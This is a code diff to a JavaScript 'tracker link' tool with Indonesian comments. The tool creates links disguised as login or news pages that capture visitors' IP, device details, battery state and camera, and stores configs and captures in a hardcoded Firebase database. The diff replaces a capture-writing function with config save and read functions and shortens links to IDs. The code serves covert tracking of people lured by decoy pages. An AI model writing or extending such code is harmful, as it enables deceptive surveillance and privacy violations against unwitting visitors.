@@ -5,11 +5,17 @@
 
 const STORAGE_KEY  = 'tracker_links';
 const SETTINGS_KEY = 'tracker_settings';
+export const DEFAULT_FB_URL = 'https://tracking-68ab9-default-rtdb.asia-southeast1.firebasedatabase.app';
 
 /* ── Settings ─────────────────────────────────────────────── */
 export function getSettings() {
-  try { return JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}'); }
-  catch { return {}; }
+  try {
+    const s = JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}');
+    if (!s.firebaseUrl) s.firebaseUrl = DEFAULT_FB_URL;
+    return s;
+  } catch {
+    return { firebaseUrl: DEFAULT_FB_URL };
+  }
 }
 export function saveSettings(s) {
   localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
@@ -27,23 +33,27 @@ export function decodeConfig(encoded) {
   } catch { return null; }
 }
 
-/* ── Firebase Realtime Database (REST API, tanpa SDK) ─────── */
-// Tulis capture ke Firebase agar creator bisa lihat data orang lain
-export async function writeToFirebase(fbUrl, linkId, capture) {
-  if (!fbUrl) return;
-  const url = `${fbUrl.replace(/\/$/, '')}/captures/${linkId}.json`;
+export async function saveConfigToFirebase(fbUrl, config) {
+  const urlBase = fbUrl || DEFAULT_FB_URL;
+  if (!urlBase) return;
+  const url = `${urlBase.replace(/\/$/, '')}/links/${config.id}.json`;
   try {
-    const response = await fetch(url, {
-      method: 'POST',
+    await fetch(url, {
+      method: 'PUT',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(capture),
+      body: JSON.stringify(config),
     });
-    if (!response.ok) {
-        console.error('Firebase POST gagal:', response.statusText);
-    }
-  } catch (error) {
-    console.error('Gagal tulis ke Firebase:', error);
-  }
+  } catch {}
+}
+
+export async function readConfigFromFirebase(fbUrl, id) {
+  const urlBase = fbUrl || DEFAULT_FB_URL;
+  if (!urlBase) return null;
+  const url = `${urlBase.replace(/\/$/, '')}/links/${id}.json`;
+  try {
+    const res = await fetch(url);
+    return await res.json();
+  } catch { return null; }
 }
 
 // Baca semua captures dari Firebase untuk satu link
@@ -96,7 +106,7 @@ const THEME_PATHS = {
   login:    'masuk',
 };
 
-export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
+export async function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
   const links    = getLinks();
   const settings = getSettings();
   const id       = generateId();
@@ -106,7 +116,6 @@ export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBatter
     id,
     decoyTheme: theme,
     options: { trackIp, trackDevice, trackBattery, trackCamera },
-    // Sertakan Firebase URL agar visitor bisa langsung kirim data ke DB creator
     notif: {
       tg: null,
       dc: null,
@@ -114,12 +123,17 @@ export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBatter
     },
   };
 
-  const encoded   = encodeConfig(config);
-  const themePath = THEME_PATHS[theme] || 'info/terbaru';
+  // Simpan config ke Firebase agar URL pendek cukup pakai id
+  const fbUrl = settings.firebaseUrl;
+  if (fbUrl) {
+    await saveConfigToFirebase(fbUrl, config);
+  }
+
+  const themePath = THEME_PATHS[theme] || 'berita';
 
   const newLink = {
     id, name: name || `Link #${links.length + 1}`,
-    encoded, themePath, decoyTheme: theme,
+    encoded: id, themePath, decoyTheme: theme,
     options: config.options, captures: [],
     createdAt: new Date().toISOString(),
   };
